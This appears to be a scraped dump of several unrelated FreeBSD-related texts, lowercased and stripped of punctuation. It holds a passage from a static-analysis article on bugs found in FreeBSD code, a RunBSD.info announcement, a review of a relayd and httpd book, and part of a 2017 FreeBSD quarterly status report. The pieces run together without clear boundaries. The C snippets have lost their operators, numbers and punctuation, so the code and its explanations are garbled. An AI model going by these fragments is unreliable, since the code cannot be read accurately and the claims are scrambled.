code ifdef q undef q endif define q r r r r r r r r r static const struct txschedule seriesquarter q q q q q q q q q q q q q q q q q q q q q q q q q q q q q q q q undef qthe macro q expanded analyzer think comparison suspicious example issue warning expression literal double type compared value int type consider inspecting expression txschedulesh analyzer issued warning arraythere several array freebsd code sum total analyzer issued warning high level let remind warning high level code mean macro cause warningsin word eliminate incorrect message high level making certain setting analyzer different way perhaps easiest way would disable warning file array kind write comment v somewhere filei already written topic false positive state get constantly asked percentage false positive even calculate average percentage based analysis large number project practical value interested average temperature different city large countryit depends project developer may lucky set analyzer much work list warning right away others lucky case freebsd project configuration marking macro scary may seem first glance showed remove lot false positive situation warning caused strange macrosif difficult suppress noise able find error one eveninga new view worldwe decided see world broadly fragment saw error code smell try seeing potential vulnerability decided start classifying warning issued pvsstudio according common weakness enumeration cwe pvsstudio searching software weakness course small part bug exploited word found cwe error turn cve however bug fall classification cwe found static analysis betteruse pvsstudio prevent vulnerability article demonstrate analyzer cope task really wellpotential null pointer dereferencein total seen error kind perhaps also skipped amountlet start simple casevoidqlmbxisr void arg ha arg ha null deviceprintf ha pcidev arg nulln func return pvsstudio warning dereferencing null pointer ha might take place qlisrc see error right away pointer ha equal null dereferenced expression ha pcidevthe situation seen three file dereferencing null pointer sc might take place twscamc dereferencing null pointer ni might take place dereferencing null pointer sbp might take place sbpc let look complex situation static int ecoreiltclientmemop struct bxesoftc sc int clinum memop int rc struct ecoreilt ilt scilt sc struct iltclientinfo iltcli ilt client clinum ilt ilt line return pvsstudio warning ilt pointer utilized verified nullptr check line ecoreinitopsh take closer look everybody may understand danger codefirst pointer ilt dereferencedstruct iltclientinfo iltcli ilt client clinum verified nullif ilt ilt line therefore may null pointer dereference inevitably result undefined behaviorsome may argue problem pointer really get dereferenced may say code evaluates address array cell say yes address incorrect used however check function exit pointer ilt zero thus invalid pointer iltcli used anywhere errorthey right correct way thinking null pointer dereference cause undefined behavior therefore code incorrect think way could work whatever wantshowever explanation usually exhaustive try develop idea compiler know null pointer dereference undefined behavior therefore pointer dereferenced null null compiler full right remove redundant ilt check result pointer equal null function exit function start handling invalid pointer lead anythingsome may object macro offsetof sometimes define offsetof st sizet st null pointer dereference code work prof construction quite validthey wrong prof nothingwhen considering idiomatic implementation offsetof remember compiler allowed use nonportable technique implement functionality fact compiler us constant null pointer offsetof implementation really mean user code safely execute ilt client clinum ilt null pointermore detail subject found article null pointer dereferencing cause undefined behavior result code described real error fixednow sorted nuance null pointer dereference becomes clear following function also incorrectstatic struct iscsioutstanding iscsioutstandingadd struct iscsisession struct iclpdu request union ccb ccb initiatortasktagp struct iscsioutstanding io int error iscsisessionlockassert io umazalloc iscsioutstandingzone mnowait mzero io null iscsisessionwarn failed allocate zd byte sizeof io return null error iclconntasksetup isconn request ccb csio initiatortasktagp io ioiclprv pvsstudio warning dereferencing null pointer ccb might take place null pointer passed iscsioutstandingadd function inspect third argument check line iscsic may unclear analyzer decided pointer ccb null pointer therefore note analyzer point one fragment see call scsioutstandingadd function receives null actual argument static voidiscsiactionabort struct iscsisession union ccb ccb io iscsioutstandingadd request null initiatortasktag analyzer interprocedural analysis find defectnow let take brake looking complex bug look simple case incorrect error handlerint radeoncsioctl struct drmdevice dev void data struct drmfile fpriv struct drmradeonprivate devpriv dev devprivate devpriv null drmerror called initializationn mtxunlock devpriv cscsmutex return einval pvsstudio warning dereferencing null pointer devpriv might take place radeoncsc body statement executed pointer devpriv zero thus strange address get evaluated devpriv cscsmutex indeed uboh trouble null pointer seem endless headache many programming language get coffee continue readingstatic voidbwntxpwr void arg int npending struct bwnmac mac arg struct bwnsoftc sc mac macsc bwnlock sc mac mac macstatus bwnmacstatusstarted mac macphysettxpwr null mac macphysettxpwr mac bwnunlock sc pvsstudio warning mac pointer utilized verified nullptr check line ifbwnc pointer mac dereferenced first verified null simple commentsstruct opcodeobjrewrite voidipfwaddobjrewriter struct opcodeobjrewrite rw sizet count memcpy tmp sizeof rw memcpy tmp rw count sizeof rw qsort tmp sz sizeof rw compareopcodes switch new free old null free mipfw tmp sz pvsstudio warning pointer utilized verified nullptr check line ipfwsockoptc beginning pointer used actual argument memcpy function memcpy tmp sizeof rw suddenly programmer remembers verified null null let look another incorrect code created release resource static intmlyusercommand struct mlysoftc sc struct mlyusercommand uc struct mlycommand mc mc mcdata null free mc mcdata mdevbuf mc null mlylock sc mlyreleasecommand mc mlyunlock sc return error pvsstudio warning mc pointer utilized verified nullptr check line mlyc think stop looking null pointer description error getting boring also see null pointer dereference following section code cm pointer utilized verified nullptr check line mfic cm pointer utilized verified nullptr check line mprsaslsic cm pointer utilized verified nullptr check line mpssaslsic pointer utilized verified nullptr check line ipfwsockoptc ccb pointer utilized verified nullptr check line iscsisubrc satorgiocontext pointer utilized verified nullptr check line smsatcbc satorgiocontext pointer utilized verified nullptr check line smsatcbc pointer utilized verified nullptr check line midic pointer utilized verified nullptr check line midic e pointer utilized verified nullptr check line via pointer utilized verified nullptr check line via pointer utilized verified nullptr check line end bored looking kind error switched warning different type pvsstudio waiting hero examine warning refer null use sizeof pointer typelet look definition pfloghdr structure struct pfloghdr length safamilyt af action reason char ifname ifnamsiz char ruleset pflogrulesetnamesize rulenr subrulenr uidt uid pidt pid uidt ruleuid pidt rulepid dir pad see structure quite large common practice structure whole structure filled zero programmer set value separate membershowever function programmer failed initialize structure correctly let take look code function static struct pfloghdr plog memset plog sizeof plog plog length pflogrealhdrlen plog af family plog action pfnat plog dir pfin plog rulenr htonl n plog subrulenr htonl sn plog ruleset strlcpy plog ifname sizeof plog ifname plog pfloghdrlen pvsstudio warning call memset function lead underflow buffer plog sizeof plog evaluates size pointer size structure result several fist byte get zeroed whole structure field structure remain uninitialized course correct value get explicitly written member however number member structure remains uninitializedthe error seen file call memset function lead underflow buffer plog use uninitialized variablelet take look another error variable initializedosglobal tiroott tiroot tiioctlpayloadt agioctlpayload void void unsigned long resettype status tmfpassthroughreqt tmfreq defined freebsd status ostisendresetdeviceioctl tiroot tmfreq pathid tmfreq targetid tmfreq lun resettype endif status returned ostisendresetdeviceioctl dn status status ioctlcallsuccess agioctlpayload status status return status status ioctlcallsuccess return status pvsstudio warning uninitialized variable status used tdioctlc macro freebsd declared declared condition defined freebsd executed result code inside construction endif get compiled variable status remains buffer access incorrect length valuetypedef struct qlsmpidglblhdr cookie id timelo qlsmpidglblhdrt struct qlsmpicoredump qlsmpidglblhdrt mpiglobalheader typedef struct qlsmpicoredump qlsmpicoredumpt intqlsmpicoredump qlahostt ha qlsmpicoredumpt mpidump qlmpicoredump memcpy mpidump mpiglobalheaderid mpi coredump sizeof mpidump mpiglobalheaderid pvsstudio warning call memcpy function lead mpi coredump buffer becoming range qlsdumpc cite quite large piece code show type structure member declared please yawn significant code id memcpy id mpi coredump sizeof id important u operator sizeof evaluates size array return string mpi coredump take byte taking terminal null accountwe byte string copied byte located string practice code may even work byte copied garbage fragment another string formally array index bound thus lead undefined program improper validation array indexnow good cause demonstrate one new diagnostics implemented pvsstudio idea diagnostic beginning value variable used size array index value compared array size may point logical error code typo one comparisonsin essence diagnostic similar already quite familiar readerslet take look diagnostic triggered check freebsd codestatic voidsbptargmgmhandler struct fwxfer xfer int exclusive lun lun id lstate orbi sc lstate lun lun maxlun lstate null exclusive stailqfirst lstate logins null stailqfirst lstate logins fwdev orbi fwdev error orbi statusdead orbi statusstatus statusaccessdeny orbi statuslen break pvsstudio warning value lun variable checked used perhaps mistake program logic check line sbptargc programmer used lun index access istate array see check index value exceeds maximum value equal maxlun exceeds situation handled erroneous already late since already could access beyond array boundsformally result undefined behavior practice instead correct handling incorrect index value may get access violationlet consider interesting case incorrect array indexing define define define rtwnridxcount pwr rtwnridxmcs struct rtwnsoftc sc int chain struct c power rtwnridxcount const struct base r rstxagc ridx ridx rtwnridxcount ridx r regulatory power ridx base pwr ridx else r regulatory c power ridx base pwr group ridx else r regulatory power ridx base pwr ridx analyzer issued three warning three statement access pwr array array overrun possible value ridx index could reach array overrun possible value ridx index could reach array overrun possible value ridx index could reach value ridx index loop change rtwnridxcount mean variable ridx take value range first glance everything okto find error let u look pwr member twodimensional array pwr take one look array accessed loop base pwr ridx ridx base pwr group ridx ridx base pwr ridx ridx something clearly wrong see array index bound however find difficult imagine code work incorrect block delimitationstatic intsmbfsgetattr ap struct vopgetattrargs ap np nflag nopen np nsize oldsize smbfsfreescred scred return pvsstudio warning code operational logic correspond formatting statement indented right always executed possible curly bracket missing smbfsvnopsc code formatting correspond logic execution visually seems line smbfsfreescred scred executed condition true reality line always executedperhaps real error code formatting would enough fragment deserves close attentionthe analyzer issued similar suspicious code fragment cite similar text warning code operational logic correspond formatting statement indented right always executed possible curly bracket missing ctlc code operational logic correspond formatting statement indented right always executed possible curly bracket missing code operational logic correspond formatting statement indented right always executed possible curly bracket missing inmcastc code operational logic correspond formatting statement indented right always executed possible curly bracket missing assignment variable without use unused variable intipfpftpport softf fin ip nat ftp dlen ipfftpsoftct softf frinfot fin ipt ip natt nat ftpinfot ftp int dlen nat natdir natinbound ntohl nat natndstaddr else ntohl ip ipsrcsaddr ntohl ip ipsrcsaddr pvsstudio warning variable assigned value twice successively perhaps mistake check line ipftppxyc variable assigned value ntohl ip ipsrcsaddr regardless conditionit seems last assignment necessary perhaps result sloppy refactoringlet continue looking error kind static inline int ecorefuncsendswitchupdate struct bxesoftc sc struct ecorefuncstateparams params ecoretestbit ecorefupdatevlanforceprioflag switchupdateparams change rdata sdvlanforcepriflg rdata sdvlanforcepriflg switchupdateparams vlanforceprio pvsstudio warning rdata sdvlanforcepriflg variable assigned value twice successively perhaps mistake check line ecorespc situation quite similar dwell let move onstatic intixgbeaddvf devicet dev vfnum const nvlistt config nvlistexistsbinary config macaddr mac nvlistgetbinary config macaddr null bcopy mac vf etheraddr etheraddrlen nvlistgetbool config allowsetmac vf flag ixgbevfcapmac else administrator specified mac address must allow vf choose one vf flag ixgbevfcapmac vf flag ixgbevfactive pvsstudio warning vf flag variable assigned value twice successively perhaps mistake check line ifixc likely missing correct code follows vf flag ixgbevfactive general detected error look really scary number exact see many error noted article really getting closer endtypedef struct mask lsigsett intlinuxsigreturn struct thread td struct linuxsigreturnargs args lsigsett lmask lmaskmask framesfscscmask lmaskmask framesfextramask pvsstudio warning lmaskmask variable assigned value twice successively perhaps mistake check line uint sysctlloglevel int sysctlchgloglevel sysctlhandlerargs uint level uint int error error sysctlhandleint oidp level req error return error sysctlloglevel level snlogdebugmax snlogdebugmax level sysctlloglevel level snloglow snloglow level return pvsstudio warning sysctlloglevel variable assigned value twice successively perhaps mistake check line aliassctpc code written using copypaste name last variable forgotten changed written sysctlloglevel level snloglow snloglow sysctlloglevel see philosophical research article topic last line effect explained let continue exploring deep rabbit hole goesstatic intuathtxstart struct uathsoftc sc struct mbuf struct ni struct uathdata data chunk flag mflags mfrag uathcflagsfinal mflags mlastfrag chunk flag uathcflagsfinal chunk flag uathcflagsfinal pvsstudio warning chunk flag variable assigned value twice successively perhaps mistake check line ifuathc time insert picture relax think one perfectstatic void lvdspllfeedbackdiv lvdspllvcocontrol lvdspllfeedbackdiv lvdspllfeedbackdiv pvsstudio warning lvdspllfeedbackdiv variable assigned value twice successively perhaps mistake check line override variable value magic number strange suspicious look like someone wrote line debugging purpose forgot remove itstatic struct bhndpmusoftc sc xtal pmuctrl write xtalfreq set divisor also pmuctrl sc bhndpmuctrl pmuctrl bhndpmuctrlilpdivmask bhndpmuctrlxtalfreqmask pmuctrl bhndpmusetbits xt fref bhndpmuctrlilpdiv pmuctrl bhndpmusetbits xt xf bhndpmuctrlxtalfreq pvsstudio warning pmuctrl variable assigned value twice successively perhaps mistake check line bhndpmusubrc operator accidentally written last issue kind today void struct hw mcaddrlist mcaddrcount mcaddrcount msgbuf mcaddrcount msgbuf msgbuf mcaddrcount pvsstudio warning msgbuf variable assigned value twice successively perhaps mistake check line expression always false maxncqdepth scistatus scifuserparametersset scicontrollerhandlet controller scifuserparameterst scifparms scifparms sasmaxncqdepth scifparms sasmaxncqdepth return scifailureinvalidparametervalue pvsstudio warning expression always false scifsascontrollerc variable le greater time replace operator check range correctlybecause error function check input data may work incorrect datanow interesting case firstly let consider prototype function libaliassetmode unsigned int libaliassetmode function return value unsigned type case internal error function returned value thus turn uintmaxnow let see function usedstatic intngnatrcvmsg nodep node itemp item hookp lasthook libaliassetmode priv lib ngnattranslateflags mode flag ngnattranslateflags mode mask error enomem break pvsstudio warning expression always false unsigned type value never ngnatc course condition always false value unsigned type le zerothis error would hard notice simple code review case error function return check foo seems wellbut wrong type function spoil everything variant correct make function libaliassetmode return signed int type check result function comparing returned value uintmaxit developer decide variant choosein next fragment probably real error code redundant know hard say sure struct athhal ah uint q cwmin chancwmin value value ahp ahbeaconinterval ah ahconfigahadditionalswbabackoff ah ahconfigahswbeaconresponsetime ah ahconfigahdmabeaconresponsetime value value value value pvsstudio warning expression value always false unsigned type value never finding error static voiddtracedebugoutput void first next char dtracedebugbufr count uintptrt next uintptrt first p first p next p p else next first char dtracedebugbufr count uintptrt last uintptrt first p first p last p p count uintptrt next uintptrt bufr p bufr p next p p pvsstudio warning use else pattern detected probability logical error presence check line dtracedebugc pay attention two line first next else next first programmer intended write another condition failed therefore second condition always expression always trueintmfitboltsendframe struct mfisoftc sc struct mficommand cm cdb check inquiry command coming cli cdb cdb reqdesc mfitboltbuildmptcmd sc cm null deviceprintf sc mfidev mapping mfi mpt failed n return pvsstudio warning expression cdb cdb always true probably operator used mfitboltc condition cdb cdb written incorrectly byte equal vice versa result condition always truenow let consider two loop implemented complicated scary waystatic voidsafemcopy struct mbuf srcm struct mbuf dstm uint offset uint j dlen slen caddrt dptr sptr advance src dst offset j offset j srcm mlen j break j srcm mlen srcm srcm mnext srcm null return sptr mtod srcm caddrt j slen srcm mlen j j offset j dstm mlen j break j dstm mlen dstm dstm mnext dstm null return pvsstudio warning expression j always true unsigned type value always safec expression j always true unsigned type value always safec variable j unsigned type therefore check j meaningless could well write true know sure incorrect check cause glitch loop correctly terminated due break return statement body reckon real bug change type variable j uint inteven error code rewritten confuse developer cause issue upon modificationsi personally like bug described beautiful typo although stop decided talk cwe time beautiful weakness define ossampiencerrillegaldekparam define ossampierrdekmanagementdekunwrapfail mpidekmanagementrsp agsaroott agroot agsadekmanagementrspt piomb status ossampiencerrillegaldekparam ossampierrdekmanagementdekunwrapfail ageventeq errorqualifier pvsstudio warning part conditional expression always true sampirspc variable status missing condition thus value status get really checked condition always truelet consider one similar case try finding error function ugidfwrulevalid without reading descriptionstatic intugidfwrulevalid struct macbsdextendedrule rule rule mbrsubjectmbsflags mbsallflags mbsallflags return einval rule mbrsubjectmbsneg mbsallflags mbsallflags return einval rule mbrobjectmboflags mboallflags mboallflags return einval rule mbrobjectmboneg mboallflags mboallflags return einval rule mbrobjectmboneg mbotypedefined rule mbrobjectmbotype mboalltype mboalltype return einval rule mbrmode mbiallperm mbiallperm return einval return hard think yes static analyzer important yawn get tired viewing functionspvsstudio warning consider inspecting condition argument bitwise operation contains nonzero value macbsdextendedc let look macro mbotypedefined define mbotypedefined look rule mbrobjectmboneg mbotypedefined part condition always true look code written nearby becomes obvious programmer intention write follows rule mbrobjectmboneg mbotypedefined mbotypedefinedwell article already long reduce amount code fragment information see four part conditional expression always true expression cfgflags cfgflags always true hwpmcpivc expression cfgflags cfgflags always true hwpmcpivc identical subexpressions gaddr gaddrsaddr left right operator aliassctpc compiler removal code clear buffersint struct dev struct qp struct int inlen struct dout errcmd memset din sizeof din memset dout sizeof dout dinhdropcode dinqpn qp qpn dev din sizeof din sizeof dout return err pvsstudio warning compiler could delete memset function call used flush dout object memsets function used erase private data intention zero dout structure containing private data error structure used exact used sizeof dout count therefore compiler remove memset function callhere another sloppy zeroing struct compiler could delete memset function call used flush dout object memsets function used erase private data time telling error zeroing private data someone tell something like lying compiler leave memset function isthis bug compiler program write author compiler itso let explain modern compiler really delete memset function call optimization compiler error detail given description dead codestatic intwipciresume devicet dev struct wisoftc sc devicegetsoftc dev struct ic sc scic wilock sc sc wibustype wibuspcinative return wiunlock sc ic icnrunning wiinit sc wiunlock sc return pvsstudio warning unreachable code detected possible error present ifwipcic beginning program text see return statement attempt unlock resourcemiscellaneousi found ten quite amusing bug code know classify according cwe calling potential vulnerability still describe regardless fact classify still errorsstatic voidmacprocvmrevokerecurse struct thread td struct ucred cred struct vmmap map macmmaprevocationviacow vme maxprotection vmprotwrite vme protection vmprotwrite revokeperms vmprotread vme eflags mapentrycow mapentryneedscopy pvsstudio warning consider inspecting application logic possible else keyword missing macprocessc seems seems analyzer else keyword forgotten similarly consider inspecting application logic possible else keyword missing ifemc consider inspecting application logic possible else keyword missing ifemc nice case sloppy copypaste see error static intcyaparawinput struct cyapasoftc sc struct cyaparegs regs int freq sc deltax sc capresx sc deltax sc capresx sc deltax sc capresx sc deltax sc capresx sc deltay sc capresx sc deltay sc capresy sc deltay sc capresy sc deltay sc capresy pvsstudio warning two similar code fragment found perhaps typo capresy variable used instead capresx cyapac sc deltay sc capresx capresx replaced capresystatic intlinuxmsqidpushdown lint ver struct caddrt uaddr msgqnum ushrtmax linuxmsqidmsgqnum msgqnum else linuxmsqidmsgqnum msgqnum pvsstudio warning statement equivalent else statement linuxipcc statement equivalent else statement linuxipcc statement equivalent else statement nfsclvnopsc statement equivalent else statement smsatcbc statement equivalent else statement arcmsrc statement equivalent else statement bxec suspicious actual argument call strncmp function intipfpirccomplete ircp buf len ircinfot ircp char buf sizet len strncmp privmsg return strncmp return pvsstudio warning consider inspecting third argument function strncmp possible value correspond length string passed second argument ipircpxyc beginning check string start privmsg character space also taken accountthen check string start count space character string note single charactertime pvsstudiofreebsd code regularly checked coverity part synopsys still prevent finding potential vulnerability real bug one evening running pvsstudio code set goal finding many bug possible show pvsstudio serious competitor coverity diagnostic ability time price pvsstudio much lessconclusiontraditionally repeat static analyzer used regularly occasionally onetime check like one described article good way showing ability analyzer real use project whole point static analysis lot error corrected early phase development additionally much easier keep analyzer report clean look error among hundred false positive complete analogy compiler warningsthat enough reading article time start using pvsstudio practice suggest downloading pvsstudio without delay trying project case question regarding licensing contact u support use feedback form
468,Lobsters,freebsd,FreeBSD,Introducing RunBSD.info,https://www.geeklan.co.uk/?p=2233,introducing runbsdinfo,update mischa peter roman zolotarev github org openbsdamsterdam runbsdinfo earlier post github markdown contribution repo file filis logo,update project maintained mischa peter roman zolotarev new github org hosted openbsdamsterdam runbsdinfo introductory site covering feature benefit across different member bsd family operating system get thing started content site taken earlier post originally put together specific audience mind audience group hardware enthusiast necessarily interested software may require operating system run longer constraint scenario move cover thing generic sense allowing wider coverage highlight operating system lot room improvement site hosted github content composed markdown text file contribution welcome pull request prefer use github patch repo file plain text content via email gladly accepted reach domain blog post thanks filis logo
470,Lobsters,freebsd,FreeBSD,Book Review: Relayd and Httpd Mastery,https://www.cyberciti.biz/reviews/book-review-relayd-and-httpd-mastery/,book review relayd httpd mastery,relayd project provides book info amazon kindle edition tilted windmill latest tutorial sysadmin linuxunix open source topic via rssxml feed weekly email newsletter,httpd server web server fastcgi tl support relayd free open source loadbalancer webproxy server one use httpd relayd run static website blog php base application using openbsd freebsd trueos hardenedbsd operating system book relayd httpd mastery talk web server distribute traffic backends running dynamic web site php based web apps securing optimizing web server libressl based modern cryptography library tlsssl support loadbalancing web traffic across multiple server relayd project provides free implementation secure web engine consists relayd httpd relayd first appeared openbsd provide service help server load balancing slb openbsd packet filter pf written pierreyves ritschard reyk floeter http server httpd first appeared openbsd based code relayd development ongoing effort reyk floeter sebastian benoit florian obser various contributing openbsd hacker software used large site also ported operating system advertisement book start basic concept http protocol book divided chapter first chapter talk configuring basic web server virtual hosting password protecting directory second chapter blocking unwanted traffic redirecting traffic http status code useful seo purpose third chapter talk creating pretty url matching domain name helpful site powered wordpress blogging engine one might need use pretty url fourth chapter talk web server log management sixth chapter talk jailing httpd using chroot feature running dynamic cgi application written perl php language including info setting wordpress based site sixth chapter tl especially let encrypt ssltls setup tl security ssl stapling optimization course web server need tuning firewall tcpip level discussed seventh chapter eight chapter building redundant web server using carp protocol building failover web server useful one need use carp ip failoverchapter nine sixteen talk building advanced setup enterprise startup company setting reverse proxy server application level proxy tl accelerator offloaded tl session using relayd even know many config option possible openbsd one example outbound proxy server chapter additional note distributed file system clustering mariadb database would nice additionoverall excellent book typical michael w lucas writing style easy follow clear cut instruction ton new stuff learn one must use openbsd freebsd chance high one stick default come openbsd need use fat apache nginxlighttpd web server especially httpd relayd audited security openbsd core teambook info title relayd httpd masteryauthor michael w lucaspublisher tilted windmill presslength pagestarget professional system administrator hobbyist interested setting website running farm web server securely using openbsd freebsd friendsrating online amazon kindle edition disclaimer tilted windmill press sent u review copyposted vivek gite author creator nixcraft seasoned sysadmin devops engineer trainer linux operating systemunix shell scripting get latest tutorial sysadmin linuxunix open source topic via rssxml feed weekly email newsletter advertisement
471,Lobsters,freebsd,FreeBSD,FreeBSD Quarterly Status Report - Q1 2017,https://www.freebsd.org/news/status/report-2017-01-2017-03.html,freebsd quarterly status report,introduction core freebsdorg deb freebsdfoundationorg http wwwfreebsdfoundationorgdonate portmgrsecretary freebsdorg portmgr freebsdorg open task freebsdorg wjw digiwarenl http githubcomwjwithagenceph open task brueffer freebsdorg rwatson freebsdorg trustedbsdaudit trustedbsdorg http open task ed freebsdorg boost leveldb bitcoin reference implementation open task marius freebsdorg open task brueffer freebsdorg rwatson freebsdorg trustedbsdannounce trustedbsdorg sepherosa gmailcom honzhan microsoftcom decui microsoftcom kyliel microsoftcom http bugsfreebsdorgbugzillashowbugcgi jebjcramer intelcom ericjoyner intelcom krzysztofgalazka intelcom open task dchagin freebsdorg trasz freebsdorg mmokhi freebsdorg open task kibab freebsdorg open task rmacklem freebsdorg open task jhibbits freebsdorg open task mw semihalfcom zbb semihalfcom open task bz freebsdorg open task mmokhi freebsdorg feld freebsdorg open task dumbbell freebsdorg riggs freebsdorg rustup open task rene freebsdorg remko freebsdorg open task news home status home,introductionwhile project indicate plan b attempt iii many still hewing original plan produced impressive result please enjoy vibrant collection report covering first quarter kadukthe deadline submission covering period april june july contact freebsd core team core freebsdorg core primary function ensure longterm viability freebsd project large part ensure interaction developer remain cordial consequently project appears welcoming newcomer normally core activity around done private quiet word right ear discrete peacemaking occasional reading riot act time necessary unfortunately quarter instance private measure failed achieve desired result ended ejecting developer developer extremely talented programmer made significant contribution port collection despite portmgr found sufficiently disruptive abrasive judgement project better overall sever connection core backed sorry event came sad conclusion remain convinced necessary step safeguard character community positive light core working proposal recognise notable contributor freebsd project perhaps yet suitable put forward new committers addition usual route recognising people write number good bug report supply patch volunteer maintain port also allow recognition people contribute thing organising freebsd event promote freebsd social medium formal announcement core proposal imminent january core secretary held exercise contact source committers inactive month persuade hand commit bit planning resume working freebsd near future meant routine function grim reaper aim keep list people ability commit pretty much synchrony list people actively committing regular process fallen activity several year ago needed clear deck restarting ultimately resulted developersemeritus handing commit bit new commit bit awarded quarter core also taking sounding producing current plan number developer important freebsd user would keen see happen given work gone branch since hand would represent additional support burden security team including maintaining version software declared obsolete upstream particular openssl evennumbered release would normal rather extended lifetime mean result extending support lifetime branch news core arranged old largely inactive marketing freebsdorg mailing list wound remaining activity transferred freebsd foundation core also asked clusteradm turn internetwide access finger server freefallfreebsdorg many developer included detail phone number gecos field freebsd password database entry would revealed finger server detail nowadays generally felt inadvisable expose publicly finger still available internally within freefallfreebsdorg core recommends gecos data limited full name updated standard new committer email template reflect core looking new volunteer help several team manage various aspect project particular postmaster security team need new blood recruiting new member security team well way anyone interested joining team encouraged make known either core directly team concerned contact deb goodkin deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage software development project conference developer summit provide travel grant freebsd contributor foundation purchase support hardware improve maintain freebsd infrastructure publishes marketing material promote educate advocate freebsd project facilitates collaboration commercial vendor freebsd developer finally represents freebsd project executing contract license agreement legal arrangement require recognized legal entity work funded donation kicked new year large contribution intel netapp help u raise last quarter engaged discussion new old commercial user help facilitate collaboration explain project work ask financial contribution help u keep freebsd innovative secure reliable operating system depend please consider making donation today http wwwfreebsdfoundationorgdonate foundation improves freebsd operating system employing technical staff maintain improve critical kernel subsystem add feature functionality fix problem contribution also include funding separate project grant like port blacklistd access control daemon integration vimage support make sure freebsd remains viable solution research education computing product quarter project development highlight include commits sponsored freebsd foundation src tree base system development branch across three staff member four grant recipientsother developer multiple funded grant including cfumass project committed freebsdhead improvement blacklistd daemon port staff contribution including improvement toolchain build tool component run time library architecture release image build tooling packaged base vm subsystem bug fix significant progress inode project nearly ready commit freebsd advocacy education large part effort dedicated advocating project includes promoting work done others freebsd producing advocacy literature teach people freebsd help make path starting use freebsd contribute project easier attending getting freebsd contributor volunteer run freebsd event staff freebsd table give freebsd presentation highlight advocacy education work last quarter promoted freebsd fosdem scale asiabsdcon fossasia promoted bsdcan scale usenix lisa vbsdcon eurobsdcon call participation promoted google summer code participation social medium created flyer people post university published new face freebsd story joseph kong set marketing partnership usenix association snia published promoted janfeb issue freebsd journal http wwwfreebsdfoundationorgjournal published monthly development project update blog secured freebsd table oscon promoted available discount conference event freebsd foundation sponsor many conference event summit around globe event bsdrelated open source technology event geared towards underrepresented group support freebsdfocused event help provide venue sharing knowledge work together project facilitate collaboration developer commercial user help provide healthy ecosystem support nonfreebsd event promote raise awareness freebsd increase use freebsd different application recruit contributor project also sponsored andor attended following event last quarter fosdem freebsd developer summit sponsor asiabsdcon tokyo japan sponsor organized ran freebsd storage summit santa clara ca board member philip paeps gave freebsd presentation fossasia attended fossasia fosdem scale release engineering foundation provides fulltime staff member lead release engineering effort provided timely reliable release last year highlight last quarter include continued production weekly development snapshot branch published initial freebsd schedule project website legalfreebsd ip foundation owns freebsd trademark responsibility protect continued review request grant permission use trademark many detail supported freebsd last quarter found newsletter contact rené ladan portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg number port currently short current number pr close unassigned last quarter saw commits comitters number port number unassigned pr increased last quarter last quarter welcomed new committers eugene grosbein eugen johannes dieterich jmd larry rosenman ler mahdi mokhtari mmohki matthew rezny rezny tobias kortkamp tobik vladimir kondratyev wulf dumbbell already src committer got extension port tree also welcomed back krion miwi took bit safekeeping itetcu leeym mva olivierd pgollucci sanpei change membership portmgr antoine worked usessamba prepare removal longoutdated samba port replace modern version new default version freepascal ruby samba new variable uselocale created add lang lcall environment variable build outoftree patch added new extrapatchtree variable error message invalid optionssingle option improved major port update last quarter pkg linux firefox chromium gcc gnome xorg qt php antoine ran expruns test version update underthehood change open task number unassigned open pr still growing spare time please close contact freebsd release engineering team freebsdorg freebsd release engineering team responsible setting publishing release schedule official project release freebsd announcing code freeze maintaining respective branch among thing freebsd release engineering team continued producing weekly development snapshot branch addition freebsd schedule added project website please note however schedule website still subject change project sponsored freebsd foundation contact willem jan withagen wjw digiwarenl ceph distributed object store file system designed provide excellent performance reliability scalability object storage ceph provides seamless access object using native language binding radosgw rest interface compatible application written swift block storage ceph rados block device rbd provides access block device image striped replicated across entire storage cluster file system ceph provides posixcompliant network file system aim high performance large data storage maximum compatibility legacy application started looking ceph hast solution carp ggate really looking aim run ceph storage cluster storage node running zfs user station would running bhyve rbd disk stored ceph compiling freebsd build tool available ceph notable progress since last report important change port submitted netcephdevel however yet contain cephfuse regular update cephdevel port expected next one coming april cephfuse work allowing one mount cephfs filesystem freebsd system perform normal operation cephdisk prepare activate work filestore zfs allowing easy creation osds rbd actually buildable used manage rados block device awkward dependency linuxisms deleted binbash stay get thing running freebsd system run pkg install netcephdevel clone http githubcomwjwithagenceph build manually running dofreebsdsh checkout root part yet included krbd kernel rados block device implemented linux kernel yet freebsd kernel possible ggated could used template since similar thing two disk also userspace counterpart could ease development bluestore freebsd linux different aio apis incompatibility need resolved somehow additionally discussion freebsd aiocancel working devicetypes cephfs native filesystem though cephfuse work advantageous inkernel implementation heavy workload cython try access internal field struct dirent compile open task run integration test see freebsd daemon work linux ceph platformcompile test userspace rbd rados block device currently work testing limittedinvestigate see inkernel rbd device could developed akin ggateinvestigate keystore embedded kernel linux currently prevents building cephfs part first question whether really required krbd requires itscheduler information used moment scheduler work rather differently linux freebsd certain point time need attention srccommonthreadcc improve freebsd init script ceph stack testing purpose running ceph production machine work cephdisk cephdeploy make freebsd zfscompatiblebuild test cluster start running teuthology integration test teuthology want build libvirt quite work package freebsd already place many detail work heredesign vitual disk implementation used bhyve attached rbd image contact christian brueffer brueffer freebsdorg contact robert watson rwatson freebsdorg contact trustedbsd audit mailing list trustedbsdaudit trustedbsdorg openbsm bsdlicensed implementation sun basic security module bsm api file format userspace side capp audit implementation freebsd mac o x additionally audit trail processing tool expected work linux quarter experimental support uuids bsm trail added openbsm dtrace audit provider using functionality developed part darpa cadet project review http openbsm github repository support coverity static analysis added via travisci additionally openbsm release merged freebsd head branch project sponsored darpaafrl part open task test latest release different version freebsd mac o x linux testing latest version mac o x would particularly appreciatedfix problem reported via github freebsd bug trackerimplement feature mentioned todo list github contact ed schouten ed freebsdorg cloudabi framework allows develop strongly sandboxed application lot easily programming environment exclusively us freebsd capsicum facility feature incompatible capsicum removed entirely mean easier determine code need adjusted behave correctly sandboxed essence need patch code build last year managed port lot exciting library cloudabi highlight include sandboxing aware version boost leveldb library readily available point shift focus towards porting full application late february one lead developer bitcoin reference implementation got touch interested creating copy bitcoin better protected security bug want security bug networkingconsensus code allow attacker steal coin local wallet think use case demonstrates strength cloudabi well made addressing issue reported bitcoin developer top priority bitcoin port complete want provide binary package well project sponsored nuxi netherlandsopen task though getting bitcoin work pretty awesome nt let distract u porting piece software well maintainer piece software could benefit sandboxing sure try building using cloudabi toolchain one piece software got ported cloudabi time ago memcached user memcached feel free give 